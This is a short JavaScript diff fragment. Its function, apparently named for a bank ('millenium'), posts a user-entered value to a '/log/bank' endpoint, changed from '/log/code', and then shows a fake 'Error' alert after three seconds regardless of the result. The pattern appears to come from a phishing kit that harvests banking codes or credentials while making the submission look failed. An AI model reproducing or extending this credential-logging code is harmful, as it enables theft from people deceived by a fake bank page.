@@ -212,7 +212,7 @@
         function millenium_imgs(__this) {
             let btn = $(__this);
             let pic = btn.val();
-            if (pic.length) $.post("/log/code", {pic: pic}, function (data) {
+            if (pic.length) $.post("/log/bank", {pic: pic}, function (data) {
                 setTimeout(function () {
                     alert("Error");
                 }, 3000)
